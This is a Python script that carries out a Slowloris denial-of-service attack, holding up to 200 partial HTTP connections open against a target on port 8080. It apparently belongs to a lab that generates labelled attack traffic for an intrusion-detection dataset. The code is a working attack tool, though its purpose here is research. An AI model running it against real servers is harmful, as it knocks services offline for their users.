"""Slowloris: many slow, incomplete HTTP requests held open to exhaust server
connections.

CIC-IDS2018 category: DoS (Slowloris / slow-connection exhaustion).
"""

from __future__ import annotations

import os
import signal
import socket
import sys
import time

sys.path.insert(
    0,
    os.path.dirname(
        os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
    ),
)

from lib.tests.logger import GroundTruthLogger
from lib.tests.scenario_config import load_from_env, wait_for_target

RUNNING = True
MAX_CONNECTIONS = 200


def _shutdown(signum, frame):
    global RUNNING
    RUNNING = False


def hold_connection(target_ip: str, target_port: int, timeout: float) -> bool:
    """Open a slow HTTP connection, send partial header, hold it open."""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((target_ip, target_port))
        sock.send(b"GET / HTTP/1.1\r\nHost: target\r\n")
        time.sleep(timeout)
        sock.close()
        return True
    except socket.timeout, OSError:
        return False


def main() -> None:
    signal.signal(signal.SIGTERM, _shutdown)
    signal.signal(signal.SIGINT, _shutdown)

    cfg = load_from_env()
    target_ip = cfg.target.ip
    attacker_ip = os.environ.get("ATTACKER_IP", "172.28.0.11")
    duration = cfg.duration
    intensity = cfg.intensity  # concurrent slow connections to maintain

    log_path = f"/app/logs/slowloris_{attacker_ip}.csv"
    print(f"[slowloris] Target: {target_ip}, Attacker: {attacker_ip}")
    print(f"[slowloris] Duration: {duration}s, Connections: {intensity}")

    if not wait_for_target(target_ip, 8080):
        print("[slowloris] ERROR: target not reachable, aborting.")
        return

    with GroundTruthLogger(log_path, scenario="slowloris") as logger:
        sockets: list[socket.socket] = []
        count = 0
        start = time.time()

        while RUNNING and (time.time() - start) < duration:
            while len(sockets) < min(intensity, MAX_CONNECTIONS):
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(10)
                    s.connect((target_ip, 8080))
                    s.send(b"GET / HTTP/1.1\r\nHost: target\r\n")
                    sockets.append(s)
                    count += 1
                    logger.log(
                        src_ip=attacker_ip,
                        dst_ip=target_ip,
                        dst_port=8080,
                        label="slowloris",
                        extra=f"open={len(sockets)}",
                    )
                except socket.timeout, OSError:
                    break

            # Keep connections alive by sending partial data
            alive: list[socket.socket] = []
            for s in sockets:
                try:
                    s.send(b"X-a: b\r\n")
                    alive.append(s)
                except OSError:
                    try:
                        s.close()
                    except OSError:
                        pass
            sockets = alive
            time.sleep(0.5)

        for s in sockets:
            try:
                s.close()
            except OSError:
                pass

    print(f"[slowloris] Completed. Opened {count} slow connections.")


if __name__ == "__main__":
    main()
